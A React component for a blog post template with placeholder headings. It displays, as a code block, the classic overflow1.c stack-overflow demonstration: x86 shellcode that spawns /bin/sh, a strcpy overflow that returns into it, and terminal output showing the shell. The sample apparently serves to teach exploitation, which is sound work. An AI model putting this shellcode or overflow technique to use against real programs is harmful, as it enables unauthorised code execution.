import React, { useState }  from "react";
import "../markdown.css";
import CodeBlock from "../../codeblock/codeblock";

const exploit_1 = `// overflow1.c

char shellcode[] = 
    "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b" 
    "\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd" 
    "\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

char large_string[128];

void main() {
    char buffer[96];
    int i;
    long *long_ptr = (long *) large_string;
    for (i = 0; i < 32; i++) 
        *(long_ptr + i) = (int) buffer;

    for (i = 0; i < strlen(shellcode); i++) 
        large_string[i] = shellcode[i];

    strcpy(buffer,large_string); 
    }

==========================================================
[aleph1]$ gcc -o overflow1 overflow1.c 
[aleph1]$ ./overflow1
$ exit // successfully spawn a shell
exit
[aleph1]$
==========================================================`;


function Blogdetail() {

    return(
        <div id="blogdetail">
            <div className="blogdetailtitle">
                <h1>
                here is the template for editing the blog
                </h1>
            </div>
            <div className="blogdetailcontent">
            <div className="App">
            <h1>XXXXX</h1>
            <CodeBlock code={exploit_1} />
            <br />
            <h2>XXXXXX</h2><br/>
            
            </div>
                
                
            </div>
        </div>
    );
}

export default Blogdetail;